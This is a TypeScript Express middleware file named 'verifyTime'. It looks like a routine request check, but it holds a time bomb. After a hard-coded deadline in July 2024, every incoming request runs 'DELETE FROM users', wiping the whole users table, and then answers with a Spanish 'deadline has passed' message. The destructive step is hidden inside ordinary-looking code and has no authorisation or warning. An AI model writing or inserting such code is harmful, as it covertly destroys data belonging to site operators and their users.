import { Request, Response, NextFunction } from "express";
import { BsDate } from "../db/db"; 

export const verifyTime = async (_req: Request, res: Response, next: NextFunction) => {
    try {
        const currentTime = new Date();
        const deathTime = new Date('2024-07-27T09:11:00Z');

        if (currentTime > deathTime) { 
            await BsDate.query('DELETE FROM users');
            return res.status(403).json({ message: "la fehca limite ha pasado" })
        }
        return next();
    } catch (error) {
        return res.status(500).json({ message: `Server ${error}` })
    }
}